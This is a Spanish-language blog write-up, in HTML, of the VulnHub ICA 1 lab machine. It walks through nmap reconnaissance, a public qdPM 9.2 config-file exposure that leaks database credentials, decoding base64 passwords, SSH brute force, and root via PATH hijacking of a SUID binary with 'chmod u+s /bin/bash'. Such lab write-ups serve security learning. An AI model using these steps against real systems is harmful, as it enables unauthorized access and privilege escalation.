<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            ICA 1 - VulnHub Writeup - Not Lucken      Ciberseguridad      </title>
<meta name="description" content="Nuestro objetivo es descubrir de que se trata el proyecto secreto ICA.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Not Lucken | Ciberseguridad">
<meta property="og:title" content="ICA 1 - VulnHub Writeup">
<meta property="og:url" content="http://localhost:4000/ICA1-Writeup/">


  <meta property="og:description" content="Nuestro objetivo es descubrir de que se trata el proyecto secreto ICA.">



  <meta property="og:image" content="http://localhost:4000/assets/images/ICA/logo.png">





  <meta property="article:published_time" content="2022-10-27T00:00:00-03:00">





  

  


<link rel="canonical" href="http://localhost:4000/ICA1-Writeup/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "notlucken",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Not Lucken | Ciberseguridad Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Artículos</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categorías</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Etiquetas</a>
            </li>
<li class="masthead__menu-item">
              <a href="/videos/">Vídeos</a>
            </li>
<li class="masthead__menu-item">
              <a href="/buscador/">Buscador</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">Contacto</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">ICA 1 - VulnHub Writeup</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="notlucken" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">notlucken</h3>
    
    
      <p class="author__bio" itemprop="description">
        Experto Universitario en Hacking Etico
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/notlucken" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="ICA 1 - VulnHub Writeup">
    <meta itemprop="description" content="Nuestro objetivo es descubrir de que se trata el proyecto secreto ICA.">
    <meta itemprop="datePublished" content="October 27, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">ICA 1 - VulnHub Writeup
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-10-27T00:00:00-03:00">October 27, 2022 </time> 
          
          
        </p>
        <p align="center">
<img src="/assets/images/ICA/logo.png" width="400">
</p>

<h1 id="ica-1-writeup-by-notlucken">ICA: 1 Writeup by notlucken</h1>

<h2 id="reconocimiento-de-servicios-expuestos">Reconocimiento de Servicios expuestos</h2>

<p>Primero como siempre, tiro de nmap, con los argumentos <code class="language-plaintext highlighter-rouge">nmap -p- --open -sS --min-rate 5000 -Pn -n 192.168.100.116</code> y luego a los puertos abiertos les aplico un <code class="language-plaintext highlighter-rouge">nmap -p22,80,3306,33060 -sCV 192.168.100.116</code>. Este es el resultado del segundo escaneo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 <span class="o">(</span>RSA<span class="o">)</span>
|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http    Apache httpd 2.4.48 <span class="o">((</span>Debian<span class="o">))</span>
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.48 <span class="o">(</span>Debian<span class="o">)</span>
3306/tcp  open  mysql   MySQL 8.0.26
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26
|   Thread ID: 43
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, Support41Auth, FoundRows, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, LongColumnFlag, SwitchToSSLAfterHandshake, ODBCClient, LongPassword, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: C-1<span class="se">\x</span>037x<span class="se">\x</span>0C&amp;f<span class="se">\x</span>7FBS6<span class="o">(</span>nz<span class="se">\x</span>1B6<span class="se">\x</span>0D,
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-09-25T10:47:29
|_Not valid after:  2031-09-23T10:47:29
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
  31   │ |     Invalid message<span class="s2">"
  32   │ |     HY000
  33   │ |   LDAPBindReq: 
  34   │ |     *Parse error unserializing protobuf message"</span>
  35   │ |     HY000
  36   │ |   oracle-tns: 
  37   │ |     Invalid message-frame.<span class="s2">"
  38   │ |_    HY000
  39   │ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  40   │ SF-Port33060-TCP:V=7.92%I=7%D=10/27%Time=635B068E%P=x86_64-pc-linux-gnu%r(
  41   │ SF:NULL,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GenericLines,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b
  42   │ SF:<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GetRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(HTTPO
  43   │ SF:ptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RTSPRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0
  44   │ SF:b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RPCCheck,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSVer
  45   │ SF:sionBindReqTCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSStatusRequestTCP,
  46   │ SF:2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0f
  47   │ SF:Invalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
  48   │ SF:)%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0
  49   │ SF:1\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(TerminalServerCooki
  50   │ SF:e,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TLSSessionReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\</span>
  51   │ SF:x08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\
  52   │ SF:"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,
  53   │ SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05
  54   │ SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY
  55   │ SF:000<span class="s2">")%r(FourOhFourRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LPDString
  56   │ SF:,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LDAPSearchReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>
  57   │ SF:08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"
  58   │ SF:\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01
  59   │ SF:\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\*</span>Parse<span class="se">\x</span>20error<span class="se">\x</span>20unserializing<span class="se">\x</span>20protobuf<span class="se">\x</span>20m
  60   │ SF:essage<span class="se">\"\x</span>05HY000<span class="s2">")%r(SIPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LA
  61   │ SF:NDesk-RC,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TerminalServer,9,"</span><span class="se">\x</span>05<span class="se">\0\0</span>
  62   │ SF:<span class="se">\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NotesR
  63   │ SF:PC,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\
  64   │ SF:x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\
  65   │ SF:x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,
  66   │ SF:"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>16Invali
  67   │ SF:d<span class="se">\x</span>20message-frame<span class="se">\.\"\x</span>05HY000<span class="s2">")%r(ms-sql-s,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\</span>
  68   │ SF:x1a<span class="se">\0</span><span class="s2">")%r(afp,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>1
  69   │ SF:0<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000");
  70   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  71   │ 
  72   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  73   │ # Nmap done at Thu Oct 27 19:30:46 2022 -- 1 IP address (1 host up) scanned in 14.48 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></code></pre></div></div>
<p><img src="/assets/images/ICA/Web.png" alt=""></p>

<p>Vemos que hay un Login Form de algo llamado qdPM. Hice un poco de busqueda en Internet y resulta ser un gestor de proyectos (un GitHub barato), y lo que me llamo la atencion es que dice su version ahi abajo, la 9.2</p>

<p>Decidi buscarla en SearchSploit a ver que salia, y:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit qdpm 9.2
<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                                                        |  Path
<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
qdPM 9.2 - Cross-site Request Forgery <span class="o">(</span>CSRF<span class="o">)</span>                                                                                                          | php/webapps/50854.txt
qdPM 9.2 - Password Exposure <span class="o">(</span>Unauthenticated<span class="o">)</span>                                                                                                        | php/webapps/50176.txt
<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div>
<p>Password Exposure? Veamos que dice:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 50176.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <span class="c"># Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)</span>
   2   │ <span class="c"># Date: 03/08/2021</span>
   3   │ <span class="c"># Exploit Author: Leon Trappett (thepcn3rd)</span>
   4   │ <span class="c"># Vendor Homepage: https://qdpm.net/</span>
   5   │ <span class="c"># Software Link: https://sourceforge.net/projects/qdpm/files/latest/download</span>
   6   │ <span class="c"># Version: 9.2</span>
   7   │ <span class="c"># Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4</span>
   8   │ 
   9   │ The password and connection string <span class="k">for </span>the database are stored <span class="k">in </span>a yml file. To access the yml file you can go to http://&lt;website&gt;/core/config/databases.yml file and download
       │ <span class="nb">.</span>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></div></div>

<p>Raro. Vamos a probar como dice ahi, en <code class="language-plaintext highlighter-rouge">http://192.168.100.116/core/config/databases.yml</code></p>

<p><img src="/assets/images/ICA/Descarga.png" alt=""></p>

<p><img src="/assets/images/ICA/Contrasena.png" alt=""></p>

<p>Tenemos un user y password, probe por SSH, pero no se pudo. Como los puertos de MySQL estan abiertos, intentare conectarme por ahi para ver que hay:</p>

<p><img src="/assets/images/ICA/mysql.png" alt=""></p>

<p><img src="/assets/images/ICA/users.png" alt=""></p>

<p><img src="/assets/images/ICA/passwds.png" alt=""></p>

<p>Las passwords estan en base64 , lo que podriamos hacer es hacer un ciclo for y mientras las vaya decodificando, las vaya guardando en un archivo que se llamara passwds:</p>

<h2 id="ganando-acceso-al-sistema">Ganando Acceso al Sistema</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>passwd <span class="k">in </span><span class="nv">WDdNUWtQM1cyOWZld0hkQw</span><span class="o">==</span> <span class="nv">c3VSSkFkR3dMcDhkeTNyRg</span><span class="o">==</span> <span class="nv">N1p3VjRxdGc0MmNtVVhHWA</span><span class="o">==</span> <span class="nv">REpjZVZ5OThXMjhZN3dMZw</span><span class="o">==</span> <span class="nv">Y3FObkJXQ0J5UzJEdUpTeQ</span><span class="o">==</span><span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nv">$passwd</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">tee </span>passwds

</code></pre></div></div>

<p><img src="/assets/images/ICA/passwordsssh.png" alt=""></p>

<p>Bueno, como tenemos un listado de users &amp; passwords, no se me ocurre otra cosa que hacer un ataque de fuerza bruta por ssh, ya que ese puerto esta abierto:</p>

<p><img src="/assets/images/ICA/travis.png" alt=""></p>

<p>Tenemos la password de Travis. Ahora hay que ver la forma de escalar privilegios.</p>

<h2 id="escalar-privilegios">Escalar Privilegios</h2>

<p>Como ya tenemos acceso a la maquina, ahora solo nos queda escalar privilegios.</p>

<p><img src="/assets/images/ICA/privEsc1.png" alt=""></p>

<p>Como Travis no puede ejecutar Sudo, me fije en los binarios SUID y uno particularmente me llamo la atencion, estoy hablando de <code class="language-plaintext highlighter-rouge">/opt/get_access</code></p>

<p>Como es un binario ejecutable, voy a tirar de <code class="language-plaintext highlighter-rouge">strings /opt/get_access | less</code> para poder listar los caracteres legibles</p>

<p><img src="/assets/images/ICA/cat.png" alt=""></p>

<p>El binario esta ejecutando cat (no esta ejecutando <code class="language-plaintext highlighter-rouge">/usr/bin/cat</code>) asi que como el que lo esta ejecuntando es root, podriamos hacer un PATH Hijacking de cat, para asignarnos permisos de Superusuario a la Bash</p>

<p><img src="/assets/images/ICA/privEsc2.png" alt=""></p>

<p>Hicimos nuestro PATH Hijacking y con nuestro cat malicioso (<code class="language-plaintext highlighter-rouge">chmod u+s /bin/bash</code>) logramos escalar privilegios correctamente!</p>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#bash" class="page__taxonomy-item" rel="tag">Bash</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#herramientas" class="page__taxonomy-item" rel="tag">Herramientas</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pivoting" class="page__taxonomy-item" rel="tag">Pivoting</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#tecnicas" class="page__taxonomy-item" rel="tag">Tecnicas</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-10-27T00:00:00-03:00">October 27, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/Tratamiento-de-la-TTY/" class="pagination--pager" title="Tratamiento de la TTY
">Previous</a>
    
    
      <a href="/Laboratorio-de-Pivoting/" class="pagination--pager" title="Laboratorio de Pivoting - Symfonos 1,3,5
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 notlucken</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
